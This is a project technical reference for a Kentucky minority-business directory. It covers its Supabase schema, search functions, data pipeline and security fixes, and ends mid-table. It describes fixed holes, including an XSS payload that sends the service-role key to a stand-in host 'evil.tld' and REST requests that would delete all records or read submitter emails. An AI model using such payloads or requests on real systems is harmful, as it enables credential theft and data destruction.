# The People's Ledger — Technical Reference for Claude Sessions

**Purpose:** This document gives Claude full working context before making any changes to The People's Ledger. Read this before writing any code, editing any file, or making any Supabase recommendations. Every architectural decision here is intentional.

---

## 1. Project Overview

The People's Ledger is a free, public, searchable directory of underrepresented businesses in Kentucky. It was built to serve everyday consumers — not procurement officers — filling a gap that supplier diversity programs were never designed to address.

**Record count: 2,066** (verified against the live table 2026-07-30). The figure was documented as 1,794 for a month after the out-of-state purge dropped it; Section 12 and `README.md` carried the same stale number. **When the count changes, update it in all three places or none of them will be trustworthy.** Get the real number with:

```bash
python -c "import json;print(len(json.load(open('backups/<latest>/businesses.json',encoding='utf-8'))))"
```

Current live state (2026-07-29): status `Active` 943 / `No Website` 224 / `Inactive` 184 / null 92 · `certification_type` populated on 116, blank on 1,327 · `industry` and `services_products` complete on all 1,443 · 95 rows have no address.

**Live URL:** thepeoplesledger.net
**GitHub Repo:** github.com/jfraz757/The_Peoples_Ledger
**Branch:** main (auto-deploys to GitHub Pages on push)
**Operated by:** Education to Action LLC, Louisville, KY (Joe Frazier)
**Intentionally open-sourced** as a replicable model for other states

---

## 2. Tech Stack

**Frontend:** Vanilla HTML, CSS, JavaScript — no frameworks, no build step
**Database:** Supabase (PostgreSQL) — accessed via REST API and RPC functions
**Search:** PostgreSQL `pg_trgm` extension — trigram-based fuzzy search
**Hosting:** GitHub Pages
**Font:** Google Fonts (Michroma — display only; Arial for body)
**Favicon lookup:** Google Favicon API
**Analytics:** Cloudflare Web Analytics (automatic mode — zone is Cloudflare-proxied, no code required) + Microsoft Clarity (session recordings/heatmaps, project ID `xr6q4yw2ld`). Clarity snippet is in `index.html`, `about.html`, and every generated `businesses/*.html` page (baked into the `generate-business-pages.js` template, so it survives regeneration) — everything except `admin.html`. Added July 2026.

**Supabase credentials (hardcoded in index.html and about.html — intentional):**
```
SUPABASE_URL = "https://ursmecdpgtqckacyhnko.supabase.co"
SUPABASE_KEY = "sb_publishable_A0zmuZVHVPtosZrNdFE4GQ_sITuTrkg"
```

**Python environment (for scripts):** `C:/Users/jfraz/AppData/Local/Python/pythoncore-3.14-64/python.exe`
**API keys for scripts:** stored in `.env` file (gitignored — never commit)

---

## 3. File Structure

**This tree must stay complete.** A Claude session reads it as the inventory of the repo and will not go looking for what it does not list. In July 2026 a session read this document end to end, then rebuilt an intake cleaner that already existed as `Minority_Biz_Database_Project/data_gather_.ipynb` — because that folder was missing from this tree and the session searched only `pipeline/`. Verified against `git ls-files` 2026-07-29.

```
The_Peoples_Ledger/
├── index.html                  # Main directory page (served by GitHub Pages)
├── about.html                  # About page with live business count
├── admin.html                  # Local-only moderation tool (GITIGNORED)
├── CNAME                       # thepeoplesledger.net
├── README.md                   # Project overview + runbook (committed)
├── .gitignore                  # Excludes .env, admin.html, data/, backups/
├── generate-business-pages.js  # Builds the static /businesses/ SEO pages
├── businesses/                 # 1,443 generated pages + sitemap.xml (committed)
│
├── backup_supabase.py          # Dumps all tables to backups/<timestamp>/ as JSON (July 2026)
├── restrict_anon_grants.sql    # APPLIED July 2026 — revoked anon write access
├── drop_permissive_policies.sql# APPLIED July 2026 — dropped over-permissive RLS policies
│
├── pipeline/                   # All maintenance scripts (run manually, not deployed)
│   ├── scrape.py               # Lane 1 web discovery: Google Maps, listicles, social
│   ├── discover_categories.py  # Lane 1b: category-seeded discovery (carnicerias, asian markets)
│   ├── prepare.py              # Filter + dedupe a scrape into one dispositioned file
│   ├── resolve_review.py       # Auto-settles "Needs review" rows by reading the business site
│   ├── upload_to_supabase.py   # Insert "Good to go" rows into businesses
│   ├── enrich.py               # Post-upload: fill/repair industry + services via Claude
│   ├── enrich_submissions.py   # Same, scoped to newly-approved admin.html submissions
│   ├── dedupe_live.py          # Duplicate cleanup on the live table
│   ├── clean_addresses.py      # Strip "N/A" tokens from addresses (dry-run default)
│   ├── purge_out_of_state.py   # Remove rows whose address resolves to a non-KY state
│   ├── maintain.py             # Link-status check (monthly) + buyblack fix (as needed)
│   ├── flag_review.py          # Annotates businesses_prepared.csv before your review pass
│   ├── ledger.py               # Thin orchestrator: prep / publish / maintain / enrich-new
│   └── view_database.py        # Open a data/ CSV in D-Tale
│   #  NOTE: there is NO reconcile_certifications.py. Lane 2 intake lives in the
│   #  Minority_Biz_Database_Project notebook below; the reconcile step does not exist.
│
├── Minority_Biz_Database_Project/     # LANE 2 — certification spreadsheets (committed)
│   ├── data_gather_.ipynb             # THE EXISTING LANE 2 CLEANER. See Section 6a.
│   ├── Spreadsheets/
│   │   ├── Louisville_HRC/            # Louisville_HRC_<Month>_<Year>.csv
│   │   ├── KY_Transportation_Cabinet/ # KY_Trans_Cab_<Month>_<Year>.csv
│   │   └── KY_Finance_&_Administration/  # KY_F&A_<Month>_<Year>.csv
│   └── Old_KY_Biz_Spreadsheets/       # GITIGNORED archive (2023 spreadsheets + verifier)
│
├── docs/
│   ├── PeoplesLedger_Technical_Reference.md   # This file
│   ├── maintenance_checklist.md       # Monthly / quarterly runbook
│   ├── order_of_operations.md         # Phase 1 (CSV) vs Phase 2 (live table) ordering
│   ├── monthly_link_check.sh          # Wrapper: maintain.py
│   └── quarterly_refresh.sh           # Wrapper: the 6-step quarterly pipeline
│   #  NOTE: both .sh live HERE, not the repo root. maintenance_checklist.md tells you to
│   #  run `bash quarterly_refresh.sh` from the root, which fails. Use docs/ on the path.
│
├── data/                       # All working files (GITIGNORED, never committed)
│   ├── businesses_scraped.csv          # Raw scraper output
│   ├── businesses_scraped_sources.csv  # Per-row source audit
│   ├── businesses_scraped_checkpoint.csv
│   ├── scraper_progress.json           # Lane 1 resume state (delete to force a fresh run)
│   ├── businesses_scraped_categories.csv         # Lane 1b verified passes (read by prepare.py)
│   ├── businesses_scraped_categories_sources.csv # Lane 1b source audit
│   ├── category_review.csv             # Lane 1b manual-review queue (Tier C)
│   ├── category_progress.json          # Lane 1b resume state
│   ├── businesses_prepared.csv         # prepare.py output (the file you review)
│   ├── denylist.csv                    # Deliberate drops, recorded automatically by prepare.py
│   ├── .enrich_submissions_state.json  # enrich_submissions.py watermark
│   ├── .maintain_state.json            # maintain.py: id -> last link check (25-day skip window)
│   ├── archive/<timestamp>/            # Scrape files consumed by a completed upload
│   └── cache/                          # Cached HTML, Maps responses, extractions
│
├── backups/                    # GITIGNORED — DB dumps; contain submitter PII
│
└── (stray root files, harmless but undocumented until now)
    ├── env.example             # Template for .env
    ├── gitignore              # Leftover download, NOT the real .gitignore
    ├── checkpoint_ky_minority_businesses.csv   # Old checkpoint, 36 KB
    ├── First_looks.ipynb       # GITIGNORED personal scratch
    └── .vscode/settings.json
```

**admin.html is gitignored** — runs locally only, holds the admin password and the service-role key, never deployed.

**Gitignoring it is necessary but not sufficient.** It stops the service-role key leaking *through the repo*; it does nothing to stop script *executing inside the page*, and "runs locally" is no protection — the browser rendering admin.html has the key in scope and full network access to Supabase. Until July 2026, `s.business_name` was interpolated raw into `innerHTML` in the submission list (`renderList`) and the detail panel (`selectSubmission`), while every other field already went through `escapeHtml()` via `field()`. Business names come from anonymous submitters through index.html, and the pending list renders on dashboard load — **before** any approve/reject decision — so a business named `<img src=x onerror="fetch('https://evil.tld/?k='+SUPABASE_ADMIN_KEY)">` would exfiltrate the service-role key just from opening the queue. Manual moderation cannot mitigate this: reviewing a submission requires rendering it.

**Fix (July 2026):** both `business_name` sites and the `status` badge (which lands in a `class` attribute) now go through `escapeHtml()`, and `escapeHtml()` was extended to escape `'` and to handle `null`/`undefined`. **Rule going forward: any new `${...}` inside an `innerHTML` template string in admin.html must be wrapped in `escapeHtml()` unless it is a DB-generated integer ID.** Candidate Voice's admin panel had the same defect, more extensively, and was fixed in the same pass.

**The entire `data/` folder is gitignored.** The live site reads from Supabase, so no working file belongs in the repo. Scripts derive `data/` from their own location, so there are no hardcoded absolute paths anywhere in committed code.

---

## 4. Supabase Database Schema

### Two tables: `businesses` and `submissions`

#### `businesses` — the public-facing directory

| Column | Type | Notes |
|---|---|---|
| id | BIGINT | Auto-generated primary key |
| business_name | TEXT | |
| address | TEXT | Full address |
| phone | TEXT | |
| services_products | TEXT | Filled by Claude API where missing |
| website | TEXT | Business website URL |
| minority_type | TEXT | Comma-separated if multiple — e.g. "Black-Owned, Women-Owned" |
| industry | TEXT | One of 23 standardized categories (assigned by Claude API) |
| status | TEXT | Active / Inactive / No Website — reflects link check, not business operating status |
| kentucky_based | TEXT | Yes / No |
| certification_type | TEXT | Comma-separated if multiple — DBE, MBE, WBE, MWBE, SBE, ACDBE, VBE, SDVBE, LGBTBE, Not Certified, Unknown |

**No `status` field for moderation** — unlike CandidateVoice, every record in `businesses` is public. There is no pending/approved gate on this table. All new business submissions go through `submissions` first.

**`minority_type` is a comma-separated string**, not a normalized junction table. This is a known limitation. Do not assume it's a single value — filter logic must handle comma-separated values.

#### `submissions` — community submission queue (never public)

| Column | Type | Notes |
|---|---|---|
| id | BIGINT | Auto-generated primary key |
| submission_type | TEXT | "new" or "update" |
| business_name | TEXT | |
| address | TEXT | For new submissions only |
| phone | TEXT | For new submissions only |
| website | TEXT | For new submissions only |
| services_products | TEXT | For new submissions only |
| minority_type | TEXT | For new submissions only |
| kentucky_based | TEXT | For new submissions only |
| update_notes | TEXT | Free text correction details — for update submissions only |
| submitter_name | TEXT | Required — used for follow-up |
| submitter_email | TEXT | Required — used for follow-up, never displayed publicly |
| status | TEXT | pending / approved / rejected |
| submitted_at | TIMESTAMP | Auto-set on insert |

---

## 5. Supabase RPC Functions (Critical — Search Uses These)

The search system does NOT use direct REST queries against the `businesses` table. It calls two custom PostgreSQL RPC functions:

### `search_businesses`
Called by `fetchRecords()` in index.html. Parameters:
- `search_text` — combined name + service query string
- `area_text` — city/area filter
- `ownership_type` — "All" or a specific minority type
- `industry_filter` — "All" or a specific industry
- `page_limit` — page size (default 24)
- `page_offset` — pagination offset

Returns records with a `total_count` field on each row for pagination.

**Rebuilt June 2026.** The original used whole-string `similarity()`, which diluted short queries against long names so a single word like "chois" scored below threshold and returned nothing until more words were added. The current version:
- Matches `search_text` across `business_name`, `services_products`, AND `industry`, not the name alone.
- Primary match is a normalized substring (`ILIKE`) where both the query and the field are lowercased with all non-alphanumerics stripped, so punctuation no longer blocks matches. This is why "chois" now finds "Choi's Asian Food Market" (the apostrophe between the i and s previously broke the literal match).
- Fuzzy fallback uses `word_similarity()` (term vs the best-matching segment of the field), not whole-string `similarity()`, so short fragments match inside long names.
- Ranks exact substring hits first, then by fuzzy relevance, then alphabetically.

The return column list is flat and must match the `businesses` schema; if a column is added/renamed/removed, update the `RETURNS TABLE` block.

### `suggest_search`
Called when a search returns zero results. Parameter:
- `search_text` — the failed query

Returns the closest business names by `word_similarity` (rebuilt June 2026 to match the new search logic). Powers the "Did You Mean...?" feature.

**Critical:** If the schema of `businesses` changes (column added/renamed/removed), these RPC functions may need to be updated in Supabase. They are not auto-updated by schema changes.

---

## 6. Data Flow

### Public submission flow
```
User fills form (index.html modal — "Add a Business" or "Submit a Correction")
        ↓
POST to /rest/v1/submissions
  submission_type: "new" OR "update"
  status: "pending"
        ↓
Joe opens admin.html locally
        ↓
Admin reads /rest/v1/submissions (all statuses, ordered by submitted_at desc)
        ↓
    [APPROVE]                           [REJECT]
        ↓                                   ↓
  If submission_type = "new":         PATCH submissions
    POST to /rest/v1/businesses         set status = "rejected"
    Insert as live record
    status: "Active"
        ↓
  If submission_type = "update":
    Look up businesses by EXACT name,
    PATCH only the submitted fields
    (auto-applies since June 2026;
     alerts you if no name match)
        ↓
  PATCH submissions set status = "approved"
```

**Update submissions auto-apply to the `businesses` table (since June 2026).** When you approve an update submission, admin.html looks up the business by exact name and PATCHes only the fields that were submitted. Blank fields are ignored. If no exact name match is found, it alerts you to apply the correction manually. Free-text notes are shown in the approval alert for your review but do not auto-apply.

**`certification_type` is excluded from that PATCH (July 2026).** It used to be included, which meant a submitter could self-assert a state certification and have it published on approve. The cert checkboxes are gone from the public form, but that alone was not the fix: `anon` holds `INSERT` on `submissions`, so anyone can POST JSON directly with any `certification_type` — the form is UI, the PATCH line was the write path. admin.html still *displays* a claimed certification so you can see and verify it; it just cannot reach `businesses` automatically. See Section 6a.

### Data pipeline flow

Two intake lanes feed the one `businesses` table. They use different tools on purpose and must not be mixed.

**Lane 1 — Web discovery (quarterly).** Run from the repo root:
```
pipeline/scrape.py    → data/businesses_scraped.csv (raw web discovery)
pipeline/prepare.py   → data/businesses_prepared.csv
                        (filtered, deduped, one Disposition column:
                         Good to go / Needs review / Dropped)
   [review the "Needs review" rows; flip keepers to "Good to go"]
pipeline/upload_to_supabase.py → inserts ONLY "Good to go" rows into businesses
pipeline/enrich.py    → fills industry, then services_products, via Claude
pipeline/maintain.py  → sets status (Active / Inactive / No Website)
generate-business-pages.js → regenerates the static /businesses/ pages
```

**Lane 2 — Certification spreadsheets (as agencies refresh).** See Section 6a below for what exists and what does not. They must NOT go through prepare.py, which strips chains and out-of-state records that are legitimate on an authoritative list.

---

## 6b. Ownership evidence — the two lanes are NOT equally trustworthy

This is the single most important thing to understand before publishing anything from a scrape.

| lane | how ownership is decided | trust |
|---|---|---|
| `google_maps` | Google's own **owner-set attribute** — `extensions: [{"from_the_business": ["Identifies as Black-owned"]}]`, which the owner sets on their Business Profile | **strong** |
| `organic` | ownership language found in the text of a fetched page | **weak** |

`maps_extension_strings()` reads **extensions only, never the title or types**, and matches the phrase `"black-owned"`, not bare `"black"`. So `Black Seal Turnovers` and `Blackstone Grill` are treated identically — only the attribute counts. That guard works; it was verified against the raw cached Maps response.

**Every ownership error found in the July 2026 review came from the organic lane. None came from Maps.** The failure mode is that the extractor inherits the *page's* topic:

- **R.W. Baird**, a ~$400B national investment firm, tagged `Minority-Owned (general)` from an Owensboro Times chamber-awards article.
- **610 Magnolia** tagged `Black-Owned` from a Lee Initiative "grantee spotlight … racial justice" article — a charity that *funds* Black-owned restaurants. It is Edward Lee's restaurant and he is Korean-American. (It would legitimately qualify as `Asian-Owned`.)

### `Minority-Owned (general)` is not a category

It is what the extractor emits when it finds ownership language on a page but cannot attribute it to a group. All 196 such rows in the July run came from `organic`, **zero** from `google_maps`, and they clustered on pages with no ownership dimension at all:

```
93  somersetpulaskichamber.com/ribbon-cuttings/   every business that opened
19  itsbuzzing.com/buy-local/.../farmers-markets  farmers markets
14  thecovky.gov/experiencing-covington/          a tourism page
11  owensborotimes.com/.../chamber-celebration    where R.W. Baird came from
```

The 283 such rows already live in the directory are almost certainly the same contamination from earlier runs. That was previously recorded as a *taxonomy* gap (no matching filter pill); it is really an **evidence** gap. Exported to `data/live_minority_general_review.csv` for audit — 282 of 283 have `source: null`, so they predate source tracking and have no `Found Via` trail at all.

**The July 2026 publishing decision ("Option A"):** only rows carrying a Google owner attribute were uploaded — 622 of 967 candidates. All 333 organic rows were held. If you relax this, understand you are publishing the lane that produced every known error.

**A URL-pattern rule does not work as a substitute.** An attempt to flag organic rows whose source URL lacked ownership words hit 172 of 333 (52%) and was wrong often: `vobzone.com` is a Veteran Owned Business directory and `aviatraaccelerators.org` is a women's business accelerator, neither of which says so in the URL. The **tag value** is the reliable signal, not the URL.

---

## 6a. Lane 2 — Certification spreadsheets (what exists, what does not)

**What `certification_type` means.** It records a GOVERNMENT-granted status and may only originate from one of the three certifying bodies. It is never scraped, never inferred, and — since July 2026 — never accepted from a submitter. **Blank is the CORRECT value for the large majority of the directory** (1,327 of 1,443 rows): it means "minority-owned by our own verification, holding no state certification." Absence of a certification is accurate data, not a gap to be filled. Most minority-owned businesses have no state certification and that is fine; they belong here on equal footing. Self-reported and scrape-verified ownership is welcome and is what `minority_type` is for.

So Lane 2 has exactly one job: **catch businesses that appeared on a certifier's list since the last run.** Either a business already in the directory turns out to be certified (fill the field), or a certified business is missing from the directory entirely (a candidate to add). The second is the more valuable half — a certified business with no web presence is structurally invisible to Lane 1.

### ✅ EXISTS — intake: `Minority_Biz_Database_Project/data_gather_.ipynb`

This notebook is the Lane 2 cleaner. Do not rebuild it.

| Cell | What it does |
|---|---|
| 2 | Converts the KY Finance `.xlsx` → CSV, renames to `KY_F&A_<Month>_<Year>.csv`, **deletes the source .xlsx** |
| 4 | Renames the two `Directory_<date>_<random>.csv` exports → `Louisville_HRC_<Month>_<Year>.csv` and `KY_Trans_Cab_<Month>_<Year>.csv` |
| 6–7 | Loads all three with correct `encoding`/`skiprows` and lists their columns; dtale for eyeballing |

Cell 7 already encodes the two file-format traps: `encoding='cp1252'` and `skiprows=5` for both B2GNow CSVs, `skiprows=3` for the xlsx. **Workflow:** drop the fresh downloads into the matching `Spreadsheets/` subfolder, then run cells 2 and 4. Note both cells stamp filenames from *today's* date, and cell 2 deletes the `.xlsx`, so keep an original elsewhere if you want one.

### ❌ DOES NOT EXIST — the reconcile step

Nothing matches these files against the live `businesses` table. That is still done by hand. The June 2026 HRC merge (277 records, 208 unique companies) was a manual pass, and it is the source of the 116 rows that currently carry a `certification_type`.

**Why it has not been automated, and the constraint on any attempt:** most of the ~76 duplicate clusters `dedupe_live.py` later cleaned up came from this lane inserting businesses already present under differently formatted names. **77 rows had to be removed.** The failure mode here is not a wrong certification value — it is duplicate insertion. Any reconcile must bias hard toward matching an existing row; the insert path is the dangerous one.

### The 2026-07-29 export baseline

Compare future downloads against this. Measured, not assumed:

| | KYTC | Louisville HRC | KY Finance |
|---|---|---|---|
| Rows / unique companies | 468 / **421** | 287 / **211** | 528 / 528 |
| Certification types | SBE 421, DBE 46 | MBE 139, WBE 125, SDVOSB 7, VOSB 7, DIBE 6, LGBTBE 2 | WBE 245, MBE 156, MWBE 123 |
| In Kentucky | **171 (37%)** | 209 (73%) | 408 (77%) |
| `Ethnicity` column | ✗ | ✓ | ✗ |
| Street address | ✓ | ✓ | ✗ (city/county only) |

**Five traps in these files:**

1. **KYTC is mostly not a minority list.** 421 of 468 rows are **SBE — Small Business Enterprise, which is size-based, not ownership-based.** Only the 46 **DBE** rows reflect disadvantaged ownership. Importing the file wholesale would add ~400 businesses with no minority-ownership basis.
2. **HRC's `Ethnicity` includes 78 "Caucasian" rows** — WBE with no racial-minority component. `Ethnicity` maps to `minority_type` only conditionally: Caucasian + WBE → `Women-Owned` alone, never a racial tag.
3. **One company spans multiple rows**, one per certification held (`1OAK` is both MBE and WBE). Cert types must be **unioned per company**. Splitting them is what produced the June 2026 duplicates.
4. **Both CSVs are cp1252, not UTF-8.** They contain 0x96 en-dashes; a UTF-8 read raises `UnicodeDecodeError`.
5. **ZIP values carry a leading TAB** (`"\t11365"`), a B2GNow quirk — almost certainly the origin of the `.0` ZIP artifacts in the Change Log, once a tab-prefixed string got coerced through a float.

Also: the xlsx `Business Type` values (`Consultant`, `Supplier/Distributor`, `Trucking`, …, 12 in its `Legend` sheet) map to **none** of the 23 industries. That is where the `Construction`/`Supplier`/`Services` industry strays came from — do not write it to `industry` unmapped.

### Usage restriction on the source files

Both B2GNow CSVs carry this in their preamble: *"The information provided in this file is not to be used for unsolicited advertising, spam, or any other unauthorized use."* These are public-agency certification lists and this directory is neither advertising nor spam, but republishing is a redistribution. Flagged so the decision is deliberate — the same judgment that kept NMSDC/WBENC/NGLCC out (Section 14).

---

## 7. Page-by-Page Reference

### index.html
The entire public-facing product lives here. Features:
- **Search:** Three simultaneous search fields — business name, city/area, service/product — all passed as `search_text` and `area_text` to `search_businesses` RPC
- **Fuzzy search:** pg_trgm handles typos — "Did You Mean...?" suggestions on zero results via `suggest_search` RPC
- **Ownership type filter:** Pills for All, Black-Owned, Women-Owned, Latine-Owned, Asian-Owned, LGBTQ+-Owned, Veteran-Owned, Native American-Owned, Disability-Owned, Muslim-Owned
- **Industry filter:** 23 categories (hardcoded in UI, not dynamically loaded from DB)
- **Business cards:** Favicon, ownership badge, address, phone, services preview, website link, link status indicator
- **Pagination:** 24 records per page, total count from `total_count` field on RPC results
- **Export:** Full filtered results to CSV or JSON — calls `/rest/v1/businesses` directly with current filters, not the RPC
- **Submit modal:** Two-tab form — "Add a Business" (full profile) and "Submit a Correction" (business name + free text notes). Both post to `/rest/v1/submissions`
- **Live business count:** Fetched on page load from `businesses` table using `Prefer: count=exact`
- **Mobile responsive** with hamburger nav drawer

### about.html
Static content page. Pulls live business count from `businesses` table on load (same count fetch as index.html). Contains origin story, stat blocks, and CTA back to directory.

### admin.html (LOCAL ONLY — NOT IN REPO)
- Password-protected (hardcoded password — reason it's gitignored)
- Loads ALL submissions on login (no status filter — shows pending, approved, rejected together)
- Filter buttons: All / Pending / Approved / Rejected (client-side filter of loaded data)
- Left panel: submission list. Right panel: submission detail view
- Approve button behavior:
  - `submission_type = "new"` → POSTs to `/rest/v1/businesses`, then PATCHes submission to approved
  - `submission_type = "update"` → looks the business up by exact name and PATCHes the submitted fields onto it, then marks the submission approved. Auto-applies since June 2026 (the "manual edit required" note here was stale). `certification_type` is deliberately excluded from that patch — see Section 6 and 6a.
- Reject button: PATCHes submission to rejected only
- No verify toggle, no stats tab (simpler than CandidateVoice admin)

---

## 8. Design System

Completely different from CandidateVoice — dark theme.

- **Background:** `#1a1a1a` (body), `#111111` (hero/sections)
- **Header background:** `rgba(30, 30, 30, 0.92)` — semi-transparent sticky
- **Primary accent:** `#FFD700` (gold) — used for all headings, borders, CTAs, highlights
- **Body text:** `rgba(255,255,255,0.78)` — slightly transparent white
- **Muted text:** `rgba(255,255,255,0.45)`
- **Font (display/headings):** Michroma (Google Fonts) — letter-spacing heavy, uppercase
- **Font (body):** Arial, Helvetica, sans-serif
- **Borders:** `rgba(255, 215, 0, 0.2)` — subtle gold borders
- **Nav links:** Gold border, gold text, pill-shaped. Hover/active: gold background, dark text
- **Cards:** Dark background `rgba(30,30,30,0.85)`, gold left border accent
- **CTA buttons:** Transparent with gold border; hover fills gold

**Do not mix CandidateVoice's blue/orange design system into this project.** They are completely separate visual identities.

---

## 9. Search Architecture — Key Details

The search is powered by two PostgreSQL RPC functions, not direct table queries. This means:

1. **Never replace `fetchRecords()` with a direct REST query to `businesses`** — you'll lose fuzzy search, the `total_count` field for pagination, and ownership type filtering logic that's encoded in the function.

2. **Export is a direct REST query** — `exportAll()` calls `/rest/v1/businesses` directly because it needs all matching records, not a paginated set. This is intentional and correct.

3. **Industry pills are hardcoded** in the UI (unlike CandidateVoice where they're dynamic). The 23 categories are fixed — if you add a new category to the DB, add it to the HTML pill list too.

4. **Ownership type filtering** uses partial string matching (`ilike '%value%'`) inside the RPC function because `minority_type` is a comma-separated string. A business tagged "Black-Owned, Women-Owned" should show up under either filter.

5. **Punctuation is normalized in search (June 2026).** Both the query and the searched fields are lowercased with non-alphanumerics stripped before substring matching, so apostrophes, ampersands, and periods do not block hits. Category and free-text search are different things: putting a grocery in the Food and Beverage *category* makes the filter work, but the free-text word "groceries" only matches if the word appears in the name, services, or industry text. Keep `services_products` descriptions leading with the plain searchable business type for this reason.

---

## 10. Python Scripts Reference

All scripts load `.env` from the repo root and derive `data/` from their own location, so run them from the repo root. No hardcoded absolute paths. Python: `C:/Users/jfraz/AppData/Local/Python/pythoncore-3.14-64/python.exe`

| Script | Purpose | Frequency | API cost |
|---|---|---|---|
| `pipeline/scrape.py` | Web discovery (Maps, listicles, social) | Quarterly | SerpApi + Haiku (low) |
| `pipeline/prepare.py` | Filter geography and chains, dedupe, write the dispositioned file | After each scrape | Free |
| `pipeline/upload_to_supabase.py` | Insert "Good to go" rows in batches of 100 | After review | Free |
| `pipeline/enrich.py` | Repair/fill industry then services via Claude. Now repairs existing bad data, not just nulls. Flags: `--industries` (fill null + fix off-list labels), `--services` (fill null + expand thin text), `--reclassify "Bucket,Bucket"` (re-evaluate a bucket, move only on change), `--reenrich-services "Bucket"` (rewrite a bucket's services regardless of length), `--reenrich-groceries` (per-row classifier over Food and Beverage; rewrites only grocery/market businesses so they are findable by "groceries"), `--dry-run`, `--limit N` | After upload | ~$0.75-1.00/1000 |
| `pipeline/enrich_submissions.py` | Targeted version of `enrich.py` for community submissions approved in admin.html. Reads the `submissions` table for `status = approved` / `submission_type = new` rows submitted after a stored watermark, matches each to its `businesses` row by exact `business_name`, and fills `industry`/`services_products` only where needed (reuses `enrich.py`'s classify/infer functions). Watermark lives in `data/.enrich_submissions_state.json` (gitignored) so re-runs only touch newly-approved rows. Rows with no exact name match are skipped and printed for manual follow-up. Flags: `--dry-run` (preview, does not advance watermark), `--since ISO_TIMESTAMP` (override watermark), `--limit N`. Also runnable via `python pipeline/ledger.py enrich-new`. Does not regenerate static pages — still run `generate-business-pages.js` after. | After each batch of admin.html approvals | ~$0.75-1.00/1000 (only for rows needing work) |
| `pipeline/dedupe_live.py` | Merge duplicate rows in the live table. Groups by normalized name; survivor keeps the best address and the real business website (not a buyblack.org placeholder); same-name + same-phone rows merge even when addresses differ; genuine address conflicts go to a review CSV. `--selftest`, `--dry-run` (default), `--apply`. Needs the service-role key. | As needed | Free |
| `pipeline/maintain.py` | Link-status check; `--buyblack` also resolves buyblack.org URLs | Monthly / as needed | Free / SerpApi |
| `pipeline/flag_review.py` | Annotates `businesses_prepared.csv` with `Review Flag` and `Found Via` before your manual pass, and MOVES serious flags to "Needs review" so they cannot upload unexamined. Flags: national brand, out-of-state, no Kentucky signal, near-duplicate of a live row (fuzzy ≥88), and unverified ownership. `--report` prints without writing. Re-run after any `prepare.py`, which rebuilds the file from a fixed column list and discards both added columns. | Before each review pass | Free |
| `pipeline/ledger.py` | Thin orchestrator: `prep` (prepare + resolve_review, stops for review), `publish` (upload + enrich industries + enrich services), `maintain` (dry-run health checks), `enrich-new` (= enrich_submissions.py) | Routine path | Varies |
| `pipeline/resolve_review.py` | Auto-settles "Needs review" rows: finds the business's real site (even when the listed link is a listicle), reads the address, promotes KY / drops out-of-state. `--limit N`, `--dry-run`, `--no-serp` | After prepare.py | SerpApi (small) |
| `pipeline/view_database.py` | Open a `data/` CSV in D-Tale | As needed | Free |
| `backup_supabase.py` (repo root) | Dumps `businesses` + `submissions` to `backups/<timestamp>/` as JSON. Paginates at 1000 (PostgREST truncates silently) and exits non-zero on a zero-row dump so a scheduled run cannot fail quietly. Reads URL + service-role key from admin.html so the key lives in one place. | Before any schema/RLS/grant change; daily via Task Scheduler | Free |
| Lane 2 reconcile | **Does not exist.** Intake is `Minority_Biz_Database_Project/data_gather_.ipynb`; the match-against-live-table step is still manual. See Section 6a. | — | — |

**Consolidation note:** `prepare.py` replaces the old `triage` + `clean_ky_businesses.py`; `enrich.py` replaces `categorize_industries.py` + `fill_missing_services.py`; `maintain.py` replaces `check_link_status.py` + `fix_buyblack_urls.py`.

**Claude models:** `scrape.py` extracts with `claude-haiku-4-5`; `enrich.py` uses `claude-sonnet-4-6`.

**Upload key:** `upload_to_supabase.py` needs a key with INSERT rights (service role), distinct from the read-only publishable key used by `scrape.py` and the live site.

**Scraper data sources (all require manual download — CAPTCHA-protected):**
- Kentucky Transportation Cabinet (B2GNow portal)
- Kentucky Finance and Administration Cabinet (MWBE certification listings — `.xlsx`, converted to CSV)
- City of Louisville Human Relations Commission (diversitycompliance.com)

**Note from June 2026 data run:** The KY Transportation Cabinet and KY Finance & Administration Cabinet no longer include minority type identification in their exports. However, the **Louisville HRC database still includes both `Ethnicity` and `Certification Type` fields** in its CSV export, confirmed June 2026. A merge of HRC data (277 records, 208 unique companies) against the existing Supabase database was completed in June 2026, adding `certification_type` and `business_category` data where matches were found. The HRC export remains a reliable source for Louisville-area businesses with government certification data.

---

## 11. RLS Policies

### Grants vs policies — the distinction that hid a critical hole

**RLS being "enabled" tells you almost nothing on its own.** A request must pass **two** independent gates: the role's `GRANT` (which operations and columns) and the RLS policy (which rows). Checking only one is how the following went unnoticed until July 2026.

Until then, `anon` held `DELETE, INSERT, REFERENCES, SELECT, TRIGGER, TRUNCATE, UPDATE` on **both** `businesses` and `submissions` — and the RLS policies were permissive enough that none of it was blocked. Verified empirically with zero-row filters (`?id=eq.-1`, matching nothing): `UPDATE` and `DELETE` returned `204` on both tables. The publishable key that maps to `anon` is in index.html's page source by design, so with it anyone could:

```
DELETE /rest/v1/businesses?id=gt.0      -- destroy all 1,443 businesses
PATCH  /rest/v1/businesses?id=gt.0      -- rewrite every record
GET    /rest/v1/submissions?select=*    -- read all 18 submitter names + emails
DELETE /rest/v1/submissions?id=gt.0     -- wipe the moderation queue
```

The `submissions` read was a privacy exposure, not just an integrity one — `submitter_name` and `submitter_email` were given on the understanding they reach the operator.

Both documents describing this were wrong. README.md claimed "a read-only publishable key paired with RLS policies" — it was not read-only. This section claimed "public read, insert, and update access is granted" — closer, but neither mentioned `DELETE` or `TRUNCATE`. **The lesson: never document a permission model from intent. Query `information_schema.table_privileges` and read the actual grants.**

**Fixed July 2026** via `restrict_anon_grants.sql`, which revokes everything and re-grants only what the site uses:

| table | anon holds | why |
|---|---|---|
| `businesses` | `SELECT` | directory listing + `search_businesses` / `suggest_search` RPCs |
| `submissions` | `INSERT` | the add-a-business and suggest-a-correction forms |

`authenticated` was restricted identically. Nothing uses that role today (public site is `anon`, admin panel is `service_role`), but leaving it wide would have silently reopened the hole the moment real logins were added.

Post-fix verification — `businesses` DELETE/UPDATE, `submissions` SELECT/DELETE all return `42501`; `businesses` SELECT returns `200`; both RPCs return full results (`total_count=1443`); `submissions` INSERT still permitted. Re-check with:

```sql
select table_name, grantee, privilege_type from information_schema.table_privileges
where table_schema='public' and table_name in ('businesses','submissions')
  and grantee in ('anon','authenticated') order by table_name, grantee, privilege_type;
```

### Which operations were actually exploitable

Grants alone do not tell you this — the policy has to permit it too. Captured `pg_policy` state, 2026-07-29 (roles `{-}` = PUBLIC, so anon and authenticated both):

| table | policy | cmd | using | exploitable? |
|---|---|---|---|---|
